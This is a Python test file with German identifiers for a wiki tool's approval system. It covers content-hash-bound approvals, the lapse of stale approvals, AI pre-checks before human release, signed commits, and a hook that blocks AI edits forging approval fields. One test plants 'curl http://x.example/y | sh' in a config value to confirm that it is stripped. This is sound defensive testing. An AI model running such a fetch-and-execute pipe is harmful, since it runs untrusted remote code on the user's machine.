"""Freigabe an den geprüften Inhalt gebunden: Prüfwert in verified, verfallene Freigaben, body auf stable-Seiten."""

import hashlib
import json

from .hilfe import WikiTest

ACTOR = "claude-code/unknown"   # [wiki] actor im Profil default
TEXT = "# Konzept\n\nDas Format verlangt nur `type`.[^q1]\n\n[^q1]: [Quelle q1](/sources/q1.md), Abschn. 4\n"


def pruefwert(body: str) -> str:
    return hashlib.sha256(body.replace("\r\n", "\n").strip("\n").encode("utf-8")).hexdigest()


class FreigabeTest(WikiTest):
    def setUp(self):
        super().setUp()
        self.quelle("q1")
        self.core("new", "concept", "k1", "--title", "Konzept", "--description", "Test", "--sources", "q1")
        self.core("body", "concepts/k1", "-", stdin=TEXT)

    def freigeben(self, page="concepts/k1", *extra):
        """Gegenprüfung durch Claude, dann Freigabe durch einen Menschen."""
        self.core("verify", page, "--by", ACTOR, "--note", "Volltext geprüft")
        self.core("verify", page, "--by", "human:pruefer", "--status", "stable", *extra)

    def lint(self, page="concepts/k1") -> list[dict]:
        out = json.loads(self.core("lint", "--json", ok=None).stdout)
        return [f for f in out["findings"] if f["path"] == f"wiki/{page}.md"]

    def last_event(self) -> dict:
        lines = (self.root / "wiki" / ".events.jsonl").read_text(encoding="utf-8").splitlines()
        return json.loads(lines[-1])


class Pruefwert(FreigabeTest):
    def test_verify_schreibt_pruefwert_des_koerpers(self):
        self.core("verify", "concepts/k1", "--by", ACTOR)
        entry = self.fm("concepts/k1")["verified"][0]
        self.assertEqual(set(entry), {"by", "at", "body_sha256"})
        self.assertEqual(entry["body_sha256"], pruefwert(TEXT))

    def test_pruefwert_unabhaengig_von_zeilenenden(self):
        self.assertEqual(self.py("result = okfw.body_sha256('\\nA\\r\\nB\\n\\n')"), pruefwert("A\nB"))

    def test_gueltige_freigabe_ohne_befund(self):
        self.freigeben()
        self.assertNotIn("verified_outdated", [f["code"] for f in self.lint()])
        self.assertIn("Freigaben: 1 gültig · 0 verfallen", self.core("status").stdout)


class VerfalleneFreigabe(FreigabeTest):
    def test_body_auf_stable_setzt_draft_und_laesst_verified_stehen(self):
        self.freigeben()
        vorher = self.fm("concepts/k1")["verified"]
        done = self.core("body", "concepts/k1", "-", stdin=TEXT.replace("nur", "im Frontmatter nur"))
        self.assertIn("stable → draft", done.stdout)
        fm = self.fm("concepts/k1")
        self.assertEqual(fm["status"], "draft")
        self.assertEqual(fm["verified"], vorher)
        event = self.last_event()
        self.assertEqual(event["kind"], "update")
        self.assertIn("Freigabe durch human:pruefer", event["detail"])
        self.assertIn("verfallen", event["detail"])
        befund = [f for f in self.lint() if f["code"] == "verified_outdated"]
        self.assertEqual([f["severity"] for f in befund], ["warn"])
        status = self.core("status").stdout
        self.assertIn("Freigaben: 0 gültig · 1 verfallen", status)

    def test_abschaltbar_dann_fehler_bei_stable(self):
        with (self.root / "wiki.toml").open("a", encoding="utf-8") as f:
            f.write("\n[trust]\nedit_resets_stable = false\n")
        self.freigeben()
        self.core("body", "concepts/k1", "-", stdin=TEXT + "\nNoch ein Satz.[^q1]\n")
        self.assertEqual(self.fm("concepts/k1")["status"], "stable")
        befund = [f for f in self.lint() if f["code"] == "verified_outdated"]
        self.assertEqual([f["severity"] for f in befund], ["error"])
        self.assertIn("Prüfwert", befund[0]["message"])
        self.assertIn("davon 1 stable, seit Änderung ungeprüft", self.core("status").stdout)
        hook = json.loads(self.core("status", "--hook").stdout)["hookSpecificOutput"]["additionalContext"]
        self.assertIn("1 Seiten stable, seit Änderung ungeprüft", hook)
        node = self.py("result = {n['id']: n for n in wiki.dashboard_data()['nodes']}['concepts/k1']")
        self.assertEqual((node["release"], node["stable"]), ("outdated", True))

    def test_handaenderung_am_koerper_faellt_auf(self):
        # am Hook vorbei geschrieben, zieht niemand generated nach; der Prüfwert bemerkt es trotzdem
        self.freigeben()
        pfad = self.root / "wiki" / "concepts" / "k1.md"
        pfad.write_text(pfad.read_text(encoding="utf-8").replace("nur", "fast nur"), encoding="utf-8")
        self.assertEqual([f["severity"] for f in self.lint() if f["code"] == "verified_outdated"], ["error"])

    def test_gleicher_inhalt_aendert_nichts(self):
        self.freigeben()
        vorher = self.text("concepts/k1")
        done = self.core("body", "concepts/k1", "-", stdin=TEXT.replace("\n", "\r\n"))
        self.assertIn("unverändert", done.stdout)
        self.assertEqual(self.text("concepts/k1"), vorher)

    def test_metadaten_aendern_laesst_freigabe_gelten(self):
        # Prüfwert vorhanden: er entscheidet, nicht generated.at (lizenz, fundweg, sources ohne Textänderung)
        self.freigeben("sources/q1")
        self.core("lizenz", "sources/q1", "--name", "MIT", "--via", "originaldokument")
        self.assertNotIn("verified_outdated", [f["code"] for f in self.lint("sources/q1")])


class AlteEintraegeOhnePruefwert(FreigabeTest):
    def setze(self, verified_at: str, generated_at: str):
        self.py("wiki._write_frontmatter(wiki.page_path('concepts/k1'), {"
                f"'status': 'stable', 'verified': [{{'by': 'human:alt', 'at': {verified_at!r}}}], "
                f"'generated': {{'by': {ACTOR!r}, 'at': {generated_at!r}}}}})")

    def test_zeitvergleich_juenger(self):
        self.setze("2026-01-01T00:00:00Z", "2026-02-01T00:00:00Z")
        befund = [f for f in self.lint() if f["code"] == "verified_outdated"]
        self.assertEqual([f["severity"] for f in befund], ["error"])
        self.assertIn("ohne Prüfwert", befund[0]["message"])

    def test_zeitvergleich_aelter_bleibt_gueltig(self):
        self.setze("2026-03-01T00:00:00Z", "2026-02-01T00:00:00Z")
        self.assertNotIn("verified_outdated", [f["code"] for f in self.lint()])


class Bestand(FreigabeTest):
    """Was vorher galt, gilt weiter: body auf draft-Seiten, verify ohne Status, stable_unverified."""

    def test_body_auf_draft_bleibt_draft_ohne_hinweis(self):
        done = self.core("body", "concepts/k1", "-", stdin=TEXT + "\nMehr.[^q1]\n")
        self.assertEqual(done.stdout.strip(), "aktualisiert: wiki/concepts/k1.md")
        self.assertEqual(self.fm("concepts/k1")["status"], "draft")
        self.assertEqual(self.last_event()["detail"], "Inhalt geschrieben")

    def test_maschinenvermerk_ohne_menschen_kein_verfall(self):
        self.core("verify", "concepts/k1", "--by", ACTOR)
        self.core("body", "concepts/k1", "-", stdin=TEXT + "\nMehr.[^q1]\n")
        self.assertNotIn("verified_outdated", [f["code"] for f in self.lint()])


class GegenpruefungVorFreigabe(FreigabeTest):
    def test_freigabe_ohne_gegenpruefung_braucht_force(self):
        done = self.core("verify", "concepts/k1", "--by", "human:pruefer", "--status", "stable", ok=False)
        self.assertIn("keine Gegenprüfung", done.stderr)
        self.assertIn("--force", done.stderr)
        self.assertNotIn("verified", self.fm("concepts/k1"))
        done = self.core("verify", "concepts/k1", "--by", "human:pruefer", "--status", "stable", "--force")
        self.assertIn("ohne Gegenprüfung", done.stderr)
        self.assertEqual(self.fm("concepts/k1")["status"], "stable")
        self.assertIn("--force", self.last_event()["detail"])
        self.assertIn("human_without_check", [f["code"] for f in self.lint()])

    def test_gegenpruefung_zu_altem_inhalt_zaehlt_nicht(self):
        self.core("verify", "concepts/k1", "--by", ACTOR)
        self.core("body", "concepts/k1", "-", stdin=TEXT + "\nNeu.[^q1]\n")
        self.core("verify", "concepts/k1", "--by", "human:pruefer", "--status", "stable", ok=False)

    def test_prozess_zaehlt_als_gegenpruefung(self):
        self.core("verify", "concepts/k1", "--by", "process:nachtlauf")
        self.core("verify", "concepts/k1", "--by", "human:pruefer", "--status", "stable")
        self.assertNotIn("human_without_check", [f["code"] for f in self.lint()])

    def test_mensch_ohne_status_braucht_keine_gegenpruefung(self):
        self.core("verify", "concepts/k1", "--by", "human:pruefer", "--note", "gelesen")
        self.assertEqual(self.fm("concepts/k1")["status"], "draft")

    def test_alte_freigabe_ohne_pruefwert_meldet_nichts(self):
        self.py("wiki._write_frontmatter(wiki.page_path('concepts/k1'), {'status': 'stable', "
                "'verified': [{'by': 'human:alt', 'at': '2099-01-01T00:00:00Z'}]})")
        self.assertNotIn("human_without_check", [f["code"] for f in self.lint()])


class Charge(FreigabeTest):
    def setUp(self):
        super().setUp()
        for slug in ("k2", "k3"):
            self.core("new", "concept", slug, "--title", f"Konzept {slug}", "--description", "Test", "--sources", "q1")
            self.core("body", f"concepts/{slug}", "-", stdin=TEXT)

    def events(self, kind="verify") -> list[dict]:
        lines = (self.root / "wiki" / ".events.jsonl").read_text(encoding="utf-8").splitlines()
        return [e for e in map(json.loads, lines) if e["kind"] == kind]

    def test_mehrere_seiten_ein_aufruf_ein_ereignis_je_seite(self):
        seiten = ["concepts/k1", "concepts/k2", "concepts/k3"]
        self.core("verify", *seiten, "--by", ACTOR, "--note", "Gegenprüfung Charge 3")
        done = self.core("verify", *seiten, "--by", "human:pruefer", "--status", "stable", "--note", "Charge 3")
        self.assertEqual(done.stdout.count("verifiziert:"), 3)
        for seite in seiten:
            self.assertEqual(self.fm(seite)["status"], "stable")
        freigaben = [e for e in self.events() if e["by"] == "human:pruefer"]
        self.assertEqual(sorted(e["page"] for e in freigaben), seiten)
        self.assertEqual({e["detail"] for e in freigaben}, {"Charge 3"})

    def test_charge_ganz_oder_gar_nicht(self):
        self.core("verify", "concepts/k1", "concepts/k2", "--by", ACTOR)
        done = self.core("verify", "concepts/k1", "concepts/k2", "concepts/k3", "--by", "human:pruefer",
                         "--status", "stable", ok=False)
        self.assertIn("concepts/k3", done.stderr)
        self.assertNotIn("concepts/k1", done.stderr)
        for seite in ("concepts/k1", "concepts/k2", "concepts/k3"):
            self.assertEqual(self.fm(seite)["status"], "draft")
        self.assertEqual([e for e in self.events() if e["by"] == "human:pruefer"], [])

    def test_unbekannte_seite_bricht_vor_dem_schreiben_ab(self):
        self.core("verify", "concepts/k1", "concepts/fehlt", "--by", ACTOR, ok=False)
        self.assertNotIn("verified", self.fm("concepts/k1"))


class ZurFreigabeImDashboard(FreigabeTest):
    def setUp(self):
        super().setUp()
        self.core("new", "concept", "k2", "--title", "Konzept k2", "--description", "Test", "--sources", "q1")
        self.core("body", "concepts/k2", "-", stdin=TEXT)
        self.core("verify", "concepts/k1", "concepts/k2", "--by", ACTOR, "--note", "Volltext gegengeprüft")
        self.core("verify", "concepts/k2", "--by", "human:pruefer", "--status", "stable")
        self.core("body", "concepts/k2", "-", stdin=TEXT + "\nNeu.[^q1]\n")

    def release(self, public=False) -> dict:
        return self.py(f"result = (wiki.public_view() if {public} else wiki).dashboard_data()['release']")

    def test_liste_mit_aussagen_notiz_und_befehl(self):
        rel = self.release()
        self.assertEqual([r["id"] for r in rel["pending"]], ["concepts/k1"])
        item = rel["pending"][0]
        self.assertEqual((item["check_by"], item["note"], item["renew"]), (ACTOR, "Volltext gegengeprüft", False))
        self.assertEqual(item["claims"], [{"text": "Das Format verlangt nur `type`.[^q1]",
                                           "notes": [["q1", "Quelle q1, Abschn. 4"]]}])
        self.assertEqual([(r["id"], r["by"]) for r in rel["outdated"]], [("concepts/k2", "human:pruefer")])
        self.assertEqual(rel["human"], "human:pruefer")
        self.assertRegex(rel["command"], r"^uv run --no-config --quiet \S+okfw\.py --root \S+ verify$")

    def test_neu_gegengeprueft_steht_wieder_zur_freigabe(self):
        self.core("verify", "concepts/k2", "--by", ACTOR, "--note", "zweite Runde")
        rel = self.release()
        k2 = [r for r in rel["pending"] if r["id"] == "concepts/k2"][0]
        self.assertEqual((k2["renew"], k2["note"]), (True, "zweite Runde"))
        self.assertEqual(rel["outdated"], [])

    def test_freigegeben_faellt_aus_der_liste(self):
        self.core("verify", "concepts/k1", "--by", "human:pruefer", "--status", "stable")
        self.assertEqual(self.release()["pending"], [])

    def test_nur_in_normaler_ausgabe(self):
        with (self.root / "wiki.toml").open("a", encoding="utf-8") as f:
            f.write('\n[visibility]\nfield = "sichtbarkeit"\ndefault = "oeffentlich"\nhidden = ["intern"]\n')
        self.assertIsNone(self.release(public=True))
        self.core("dashboard", "--oeffentlich")
        html = (self.root / "build" / "wiki-dashboard-oeffentlich.html").read_text(encoding="utf-8")
        self.assertIn('"release": null', html)
        self.core("dashboard")
        html = (self.root / "build" / "wiki-dashboard.html").read_text(encoding="utf-8")
        self.assertIn('id="relcard"', html)
        self.assertIn("Volltext gegengeprüft", html)


class ZurFreigabeVoll(FreigabeTest):
    """Kennung aus [trust] human, Liste „Gegenprüfung ohne Prüfwert“ mit Aufruf aus [trust] check_command."""

    def release(self) -> dict:
        return self.py("result = wiki.dashboard_data()['release']")

    def test_kennung_aus_wiki_toml(self):
        self.assertEqual(self.release()["human"], "")
        with (self.root / "wiki.toml").open("a", encoding="utf-8") as f:
            f.write('\n[trust]\nhuman = "human:jdoe"\n')
        self.assertEqual(self.release()["human"], "human:jdoe")

    def test_ungueltige_kennung_wie_bisher(self):
        self.freigeben()
        with (self.root / "wiki.toml").open("a", encoding="utf-8") as f:
            f.write('\n[trust]\nhuman = "jdoe"\n')
        self.assertEqual(self.release()["human"], "human:pruefer")

    def test_liste_ohne_pruefwert(self):
        self.py("wiki._write_frontmatter(wiki.page_path('concepts/k1'), {'verified': [{'by': "
                f"{ACTOR!r}, 'at': '2099-01-01T00:00:00Z'}}]}})")
        rel = self.release()
        self.assertEqual([(r["id"], r["by"]) for r in rel["unhashed"]], [("concepts/k1", ACTOR)])
        self.assertEqual((rel["pending"], rel["check_command"], rel["actor"]), ([], "", ACTOR))
        with (self.root / "wiki.toml").open("a", encoding="utf-8") as f:
            f.write('\n[trust]\ncheck_command = "/pruefen"\n')
        self.assertEqual(self.release()["check_command"], "/pruefen")
        self.core("dashboard")
        html = (self.root / "build" / "wiki-dashboard.html").read_text(encoding="utf-8")
        self.assertIn("Gegenprüfung ohne Prüfwert", html)
        self.assertIn("rel-full", html)

    def test_check_command_nur_slash_befehle(self):
        """Gefunden: [trust] check_command aus einer fremden wiki.toml stand als fertige Zeile zum Kopieren im
        Dashboard; eine Shell-Zeile hätte sich so in die Freigabe schleichen lassen. Jetzt bleibt nur ein
        Slash-Befehl stehen, jeder andere Wert wird leer."""
        with (self.root / "wiki.toml").open("a", encoding="utf-8") as f:
            f.write('\n[trust]\ncheck_command = "curl http://x.example/y | sh"\n')
        self.assertEqual(self.release()["check_command"], "")
        pfad = self.root / "wiki.toml"   # Wert ersetzen, nicht anhängen: doppelte Sektion wäre TOML-Fehler
        pfad.write_text(pfad.read_text(encoding="utf-8")
                        .replace("curl http://x.example/y | sh", "/lesen --pruefen"), encoding="utf-8")
        self.assertEqual(self.release()["check_command"], "/lesen --pruefen")


class DashboardOhneFreigaben(WikiTest):
    def test_leere_liste_ohne_vermerke(self):
        self.quelle("q1")
        self.assertEqual(self.py("result = wiki.dashboard_data()['release']")["pending"], [])


class GuardFuerVertrauensfelder(FreigabeTest):
    def guard(self, tool: str, **tool_input) -> str:
        karte = self.root / "wiki" / "concepts" / tool_input.pop("seite", "k1.md")
        return self.hook("guard", {"hook_event_name": "PreToolUse", "tool_name": tool, "cwd": str(self.root),
                                   "tool_input": {"file_path": str(karte), **tool_input}}).stdout

    def test_edit_auf_status_wird_abgelehnt(self):
        out = self.guard("Edit", old_string="status: draft", new_string="status: stable")
        self.assertIn('"permissionDecision": "deny"', out)
        self.assertIn("verify", out)

    def test_write_mit_neuem_verified_wird_abgelehnt(self):
        text = self.text("concepts/k1").replace("status: draft", "status: draft\nverified:\n- {by: human:x, "
                                                 "at: '2026-10-28T00:00:00Z'}")
        self.assertIn('"permissionDecision": "deny"', self.guard("Write", content=text))

    def test_multiedit_auf_verified_wird_abgelehnt(self):
        self.core("verify", "concepts/k1", "--by", ACTOR)
        out = self.guard("MultiEdit", edits=[{"old_string": "Das Format", "new_string": "Das OKF-Format"},
                                             {"old_string": pruefwert(TEXT), "new_string": "0" * 64}])
        self.assertIn('"permissionDecision": "deny"', out)

    def test_aenderung_am_text_bleibt_erlaubt(self):
        self.core("verify", "concepts/k1", "--by", ACTOR)
        self.assertEqual(self.guard("Edit", old_string="Das Format", new_string="Das OKF-Format"), "")
        text = self.text("concepts/k1").replace("Das Format", "Das OKF-Format")
        self.assertEqual(self.guard("Write", content=text), "")

    def test_neue_seite_mit_draft_erlaubt_mit_verified_nicht(self):
        neu = "---\ntype: concept\ntitle: Neu\nstatus: draft\n---\n\nText\n"
        self.assertEqual(self.guard("Write", seite="neu.md", content=neu), "")
        neu = neu.replace("status: draft", "status: stable")
        self.assertIn('"permissionDecision": "deny"', self.guard("Write", seite="neu.md", content=neu))

    def test_andere_schreibweisen_von_status_werden_abgelehnt(self):
        for kopf in ('"status": stable', "'status': stable", "{status: stable, type: concept}", "  status: stable\n  type: concept",
                     "? status\n: stable", "!!str status: stable", "<<: {status: stable}"):
            with self.subTest(kopf=kopf):
                out = self.guard("Write", seite="neu.md", content=f"---\n{kopf}\n---\n\nText\n")
                self.assertIn('"permissionDecision": "deny"', out)

    def test_doppelter_schluessel_im_mehrzeiligen_wert(self):
        neu = '---\nstatus: stable\nx: "a\nstatus: draft\nb"\n---\n\nText\n'
        self.assertIn('"permissionDecision": "deny"', self.guard("Write", seite="neu.md", content=neu))

    def test_edit_legt_neue_seite_an(self):
        out = self.guard("Edit", seite="neu.md", old_string="", new_string="---\ntitle: N\nstatus: stable\n---\n\nText\n")
        self.assertIn('"permissionDecision": "deny"', out)

    def test_windows_zeilenenden_und_schlusszeile_wie_im_kern(self):
        out = self.guard("Write", seite="neu.md", content="---\r\ntitle: Neu\r\nstatus: stable\r\n---\r\n\r\nText\r\n")
        self.assertIn('"permissionDecision": "deny"', out)
        # der Kern nimmt auch ---x als Ende des Frontmatters
        out = self.guard("Write", seite="neu.md", content="---\ntitle: Neu\nstatus: stable\n---x\n\nText\n")
        self.assertIn('"permissionDecision": "deny"', out)

    def test_schreibweise_des_pfads_umgeht_die_pruefung_nicht(self):
        karte = self.root / "WIKI" / "CONCEPTS" / "neu.MD"
        out = self.hook("guard", {"hook_event_name": "PreToolUse", "tool_name": "Write", "cwd": str(self.root),
                                  "tool_input": {"file_path": str(karte),
                                                 "content": "---\ntitle: N\nstatus: stable\n---\n\nText\n"}}).stdout
        self.assertIn('"permissionDecision": "deny"', out)

    def test_normales_frontmatter_geht_durch(self):
        neu = ("---\n# Kommentar\ntype: concept\ntitle: Neu\nstatus: draft\ntags:\n- a\n- b\nsources:\n  - x\n"
               "generated:\n  at: '2026-10-28T00:00:00Z'\n\n---\n\nText\n")
        self.assertEqual(self.guard("Write", seite="neu.md", content=neu), "")

    def test_edit_unter_ungewoehnlichem_frontmatter_geht_durch(self):
        karte = self.root / "wiki" / "concepts" / "alt.md"
        karte.write_text('---\n"title": Alt\n---\n\nDas Format\n', encoding="utf-8")
        self.assertEqual(self.guard("Edit", seite="alt.md", old_string="Das Format", new_string="Ein Format"), "")
        self.assertIn('"permissionDecision": "deny"',
                      self.guard("Edit", seite="alt.md", old_string='"title": Alt', new_string='"status": stable'))

    def test_verify_ueber_bash_ist_nicht_betroffen(self):
        # Der Guard hängt nur an Write/Edit; verify schreibt selbst
        self.core("verify", "concepts/k1", "--by", ACTOR)
        self.assertEqual(self.fm("concepts/k1")["verified"][0]["by"], ACTOR)


class SignierteFreigabe(FreigabeTest):
    GIT_ENV = {"GIT_CONFIG_GLOBAL": "/dev/null", "GIT_CONFIG_NOSYSTEM": "1"}

    def git(self, *args):
        import subprocess
        from .hilfe import clean_env
        done = subprocess.run(["git", "-C", str(self.root), *args], capture_output=True, text=True,
                              env=clean_env(**self.GIT_ENV), timeout=60)
        self.assertEqual(done.returncode, 0, done.stderr)
        return done.stdout

    def setUp(self):
        super().setUp()
        import shutil
        if shutil.which("git") is None or shutil.which("ssh-keygen") is None:
            self.skipTest("git oder ssh-keygen fehlt")
        self.git("init", "-q")
        for key, value in (("user.name", "Test"), ("user.email", "test@example.org"), ("commit.gpgsign", "false")):
            self.git("config", key, value)
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "Start")
        self.freigeben()

    def lint_codes_signiert(self) -> list[str]:
        return [f["code"] for f in self.lint()]

    def opt_in(self):
        with (self.root / "wiki.toml").open("a", encoding="utf-8") as f:
            f.write("\n[trust]\nsigned_human = true\n")

    def test_ohne_opt_in_keine_pruefung(self):
        self.assertNotIn("human_unsigned", self.lint_codes_signiert())

    def test_nicht_committet_und_unsigniert(self):
        self.opt_in()
        befund = [f for f in self.lint() if f["code"] == "human_unsigned"]
        self.assertEqual(len(befund), 1)
        self.assertIn("noch nicht committet", befund[0]["message"])
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "Freigabe ohne Signatur")
        befund = [f for f in self.lint() if f["code"] == "human_unsigned"]
        self.assertIn("ohne gültige Signatur", befund[0]["message"])

    def test_signierter_commit_ohne_befund(self):
        import subprocess
        self.opt_in()
        key = self.base / "schluessel"
        subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "test", "-f", str(key)], check=True,
                       capture_output=True, timeout=60)
        signers = self.base / "allowed_signers"
        signers.write_text("test@example.org " + key.with_suffix(".pub").read_text(encoding="utf-8"), encoding="utf-8")
        for k, v in (("gpg.format", "ssh"), ("user.signingkey", str(key)), ("gpg.ssh.allowedSignersFile", str(signers))):
            self.git("config", k, v)
        self.git("add", "-A")
        self.git("commit", "-q", "-S", "-m", "Freigabe signiert")
        self.assertEqual(self.git("log", "-1", "--format=%G?").strip(), "G")
        self.assertNotIn("human_unsigned", self.lint_codes_signiert())

    def test_ohne_git_repo_keine_pruefung(self):
        import shutil
        self.opt_in()
        shutil.rmtree(self.root / ".git")
        self.assertNotIn("human_unsigned", self.lint_codes_signiert())


class ZaehlenNurGueltige(FreigabeTest):
    """Vertrauensstufen nur aus Vermerken, die zum Inhalt passen; verfallene getrennt."""

    def vertrauen(self) -> str:
        return next(z for z in self.core("status").stdout.splitlines() if z.startswith("Vertrauen:"))

    def test_nach_rueckfall_nicht_mehr_human_reviewed(self):
        self.freigeben()
        self.assertIn("human-reviewed 1", self.vertrauen())
        self.core("body", "concepts/k1", "-", stdin=TEXT + "\nNeu.[^q1]\n")
        zeile = self.vertrauen()
        self.assertNotIn("human-reviewed", zeile)
        self.assertNotIn("machine-confirmed", zeile)
        self.assertTrue(zeile.endswith("· 1 verfallen"), zeile)

    def test_verfallene_prozesspruefung_zaehlt_getrennt_und_meldet_sich(self):
        self.core("verify", "concepts/k1", "--by", "process:nachtlauf")
        self.assertIn("machine-confirmed 1", self.vertrauen())
        self.core("body", "concepts/k1", "-", stdin=TEXT + "\nNeu.[^q1]\n")
        self.assertNotIn("machine-confirmed", self.vertrauen())
        self.assertIn("· 1 verfallen", self.vertrauen())
        befund = [f for f in self.lint() if f["code"] == "check_outdated"]
        self.assertEqual([f["severity"] for f in befund], ["info"])
        self.assertIn("process:nachtlauf", befund[0]["message"])
        node = self.py("result = {n['id']: n for n in wiki.dashboard_data()['nodes']}['concepts/k1']")
        self.assertEqual(node["trust"], "outdated")

    def test_status_nennt_zur_freigabe(self):
        self.core("verify", "concepts/k1", "--by", ACTOR)
        self.assertIn("Freigaben: 0 gültig · 0 verfallen · 1 zur Freigabe", self.core("status").stdout)
        hook = json.loads(self.core("status", "--hook").stdout)["hookSpecificOutput"]["additionalContext"]
        self.assertIn("1 Seiten gegengeprüft und zur Freigabe", hook)
        self.freigeben()
        self.assertIn("Freigaben: 1 gültig · 0 verfallen · 0 zur Freigabe", self.core("status").stdout)


class VermerkOhnePruefwert(FreigabeTest):
    """Ältere Vermerke ohne body_sha256 gelten weiter, zählen aber nicht als Gegenprüfung für eine Freigabe."""

    def setze(self, *verified):
        self.py("wiki._write_frontmatter(wiki.page_path('concepts/k1'), {"
                f"'verified': {list(verified)!r}, 'generated': {{'by': {ACTOR!r}, 'at': '2026-01-01T00:00:00Z'}}}})")

    def test_gilt_meldet_info_und_blockiert_freigabe(self):
        self.setze({"by": ACTOR, "at": "2026-02-01T00:00:00Z"})
        status = self.core("status").stdout
        self.assertIn("machine-confirmed 1", status)
        self.assertIn("Gegenprüfung ohne Prüfwert: 1 Seiten", status)
        befund = [f for f in self.lint() if f["code"] == "verified_unhashed"]
        self.assertEqual([f["severity"] for f in befund], ["info"])
        self.assertIn("zählt aber nicht als Gegenprüfung", befund[0]["message"])
        self.core("verify", "concepts/k1", "--by", "human:pruefer", "--status", "stable", ok=False)
        self.core("verify", "concepts/k1", "--by", ACTOR, "--note", "neu gegengeprüft")
        self.assertNotIn("verified_unhashed", [f["code"] for f in self.lint()])
        self.core("verify", "concepts/k1", "--by", "human:pruefer", "--status", "stable")

    def test_spaetere_pruefung_zu_anderem_inhalt_laesst_ihn_verfallen(self):
        self.setze({"by": ACTOR, "at": "2026-02-01T00:00:00Z"},
                   {"by": "process:nachtlauf", "at": "2026-03-01T00:00:00Z", "body_sha256": "0" * 64})
        self.assertIn("· 1 verfallen", self.core("status").stdout)
        codes = [f["code"] for f in self.lint()]
        self.assertIn("check_outdated", codes)
        self.assertNotIn("verified_unhashed", codes)


class HookZiehtGeneratedNach(FreigabeTest):
    """Edit oder Write am Körper zieht generated nach, auf stable wie body."""

    def setUp(self):
        super().setUp()
        self.py("wiki._write_frontmatter(wiki.page_path('concepts/k1'), "
                "{'generated': {'by': 'human:alt', 'at': '2026-01-01T00:00:00Z'}})")
        self.pfad = self.root / "wiki" / "concepts" / "k1.md"

    def edit(self, alt: str, neu: str, tool="Edit", response=True):
        vorher = self.pfad.read_text(encoding="utf-8")
        self.pfad.write_text(vorher.replace(alt, neu, 1), encoding="utf-8")
        event = {"hook_event_name": "PostToolUse", "tool_name": tool, "cwd": str(self.root),
                 "tool_input": {"file_path": str(self.pfad), "old_string": alt, "new_string": neu}}
        if response:
            event["tool_response"] = {"filePath": str(self.pfad), "originalFile": vorher}
        return self.hook("post-edit", event)

    def test_koerper_geaendert(self):
        done = self.edit("Das Format", "Das OKF-Format")
        gen = self.fm("concepts/k1")["generated"]
        self.assertEqual(gen["by"], ACTOR)
        self.assertGreater(gen["at"], "2026-01-01T00:00:00Z")
        event = self.last_event()
        self.assertEqual((event["kind"], event["by"], event["detail"]), ("update", ACTOR, "Edit über Claude Code"))
        context = json.loads(done.stdout)["hookSpecificOutput"]["additionalContext"]
        self.assertIn("nachgezogen", context)
        self.assertIn("neu lesen", context)

    def test_write_einer_neuen_seite_ist_create(self):
        neu = self.root / "wiki" / "concepts" / "neu.md"
        inhalt = self.pfad.read_text(encoding="utf-8").replace("title: ", "title: Neu ", 1)
        neu.write_text(inhalt, encoding="utf-8")
        event = {"hook_event_name": "PostToolUse", "tool_name": "Write", "cwd": str(self.root),
                 "tool_input": {"file_path": str(neu), "content": inhalt},
                 "tool_response": {"type": "create", "filePath": str(neu), "content": inhalt, "originalFile": None}}
        self.hook("post-edit", event)
        zeilen = (self.root / "wiki" / ".events.jsonl").read_text(encoding="utf-8").splitlines()
        ereignisse = [e for e in map(json.loads, zeilen) if e["page"] == "concepts/neu"]
        self.assertEqual([(e["kind"], e["by"]) for e in ereignisse], [("create", ACTOR)])
        self.core("rebuild", "--quiet")
        log = (self.root / "wiki" / "log.md").read_text(encoding="utf-8")
        self.assertIn("**Erstellt**: [Neu ", log)
        self.assertNotIn("**Aktualisiert**: [Neu ", log)

    def test_nur_frontmatter_geaendert(self):
        done = self.edit("description: Test", "description: Test, genauer")
        self.assertEqual(done.stdout, "")
        self.assertEqual(self.fm("concepts/k1")["generated"]["at"], "2026-01-01T00:00:00Z")
        event = self.last_event()
        self.assertEqual((event["kind"], event["by"]), ("edit", "process:claude-code-hook"))

    def test_ohne_vorher_stand_gilt_als_geaendert(self):
        self.edit("description: Test", "description: Test, genauer", response=False)
        self.assertEqual(self.fm("concepts/k1")["generated"]["by"], ACTOR)

    def test_stable_faellt_auf_draft(self):
        self.freigeben()
        done = self.edit("Das Format", "Das OKF-Format")
        self.assertEqual(self.fm("concepts/k1")["status"], "draft")
        self.assertIn("stable → draft", json.loads(done.stdout)["systemMessage"])
        self.assertIn("Freigabe durch human:pruefer", self.last_event()["detail"])
        self.assertIn("verified_outdated", [f["code"] for f in self.lint()])

    def test_stable_bleibt_wenn_freigabe_noch_passt(self):
        # ohne Vorher-Stand zieht der Hook generated nach; der Prüfwert der Freigabe passt noch, stable bleibt
        self.freigeben()
        self.edit("description: Test", "description: Test, genauer", response=False)
        fm = self.fm("concepts/k1")
        self.assertEqual((fm["status"], fm["generated"]["by"]), ("stable", ACTOR))
        self.assertNotIn("verified_outdated", [f["code"] for f in self.lint()])

    def test_kartenname_mit_bindestrich_ist_keine_option(self):
        """Gefunden: Ein Kartenname, der mit "-" beginnt, galt dem Kern als Option; generated wurde nicht
        nachgezogen. Der Hook gibt ihn erst hinter "--" weiter, und nur diese Karte und ihr Ereignis ändern sich."""
        inhalt = self.text("concepts/k1").replace("title: Konzept", "title: Strich", 1)
        neu = self.root / "wiki" / "-strich.md"
        neu.write_text(inhalt, encoding="utf-8")
        vorher = {p.relative_to(self.root).as_posix(): p.read_bytes()
                  for p in self.root.rglob("*") if p.is_file()}
        event = {"hook_event_name": "PostToolUse", "tool_name": "Write", "cwd": str(self.root),
                 "tool_input": {"file_path": str(neu), "content": inhalt},
                 "tool_response": {"type": "create", "filePath": str(neu), "content": inhalt, "originalFile": None}}
        self.hook("post-edit", event)
        geaendert = {pfad for pfad, alt in vorher.items() if (self.root / pfad).read_bytes() != alt}
        self.assertEqual(geaendert, {"wiki/-strich.md", "wiki/.events.jsonl"})
        zeilen = (self.root / "wiki" / ".events.jsonl").read_text(encoding="utf-8").splitlines()
        ereignisse = [e for e in map(json.loads, zeilen) if e["page"] == "-strich"]
        self.assertEqual([(e["kind"], e["by"]) for e in ereignisse], [("create", ACTOR)])
        self.assertEqual(self.fm("-strich")["generated"]["by"], ACTOR)
